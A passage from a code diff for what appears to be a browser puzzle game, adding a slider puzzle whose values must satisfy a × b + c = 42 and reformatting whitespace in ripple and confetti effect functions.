+            document.getElementById('sv2').textContent = b;
+            document.getElementById('sv3').textContent = c;
+
+            const result = a * b + c;
+            const resultEl = document.getElementById('sliderResult');
+            resultEl.textContent = result;
+
+            if (result === 42) {
+                resultEl.classList.add('matched');
+            } else {
+                resultEl.classList.remove('matched');
+            }
+        }
+
+        function checkPuzzle4() {
+            const a = parseInt(document.getElementById('slider1').value);
+            const b = parseInt(document.getElementById('slider2').value);
+            const c = parseInt(document.getElementById('slider3').value);
+            const result = a * b + c;
+            const fb = document.getElementById('fb4');
+
+            if (result === 42) {
+                fb.className = 'feedback ok';
+                fb.textContent = `✓ ${a} × ${b} + ${c} = 42. The answer to everything.`;
+                setTimeout(() => { confetti(); switchScreen('screen3'); }, 950);
+            } else {
+                fb.className = 'feedback err';
+                fb.textContent = `✗ ${a} × ${b} + ${c} = ${result}. You need exactly 42.`;
+            }
+        }
 
         // ══════════════════════════════════════════════
         //  UTILS
@@ -1118,15 +1686,15 @@
         }
 
         function ripple(e, btnId) {
-            const btn  = document.getElementById(btnId);
-            const r    = document.createElement('span');
+            const btn = document.getElementById(btnId);
+            const r = document.createElement('span');
             const rect = btn.getBoundingClientRect();
-            const sz   = Math.max(rect.width, rect.height);
+            const sz = Math.max(rect.width, rect.height);
             r.className = 'ripple-ring';
             r.style.cssText = `
                 width:${sz}px; height:${sz}px;
-                left:${(e.clientX || rect.left + rect.width  / 2) - rect.left - sz / 2}px;
-                top:${(e.clientY  || rect.top  + rect.height / 2) - rect.top  - sz / 2}px;
+                left:${(e.clientX || rect.left + rect.width / 2) - rect.left - sz / 2}px;
+                top:${(e.clientY || rect.top + rect.height / 2) - rect.top - sz / 2}px;
             `;
             btn.appendChild(r);
             setTimeout(() => r.remove(), 600);
@@ -1136,7 +1704,7 @@
             const cols = ['#c4a08a','#9e7a65','#c8b4d8','#a8c4d8','#e8c4a8','#a0c4a0'];
             for (let i = 0; i < 90; i++) {
                 setTimeout(() => {
-                    const p  = document.createElement('div');
+                    const p = document.createElement('div');
                     p.className = 'cpiece';
                     const sz = 5 + Math.random() * 7;
                     p.style.cssText = `
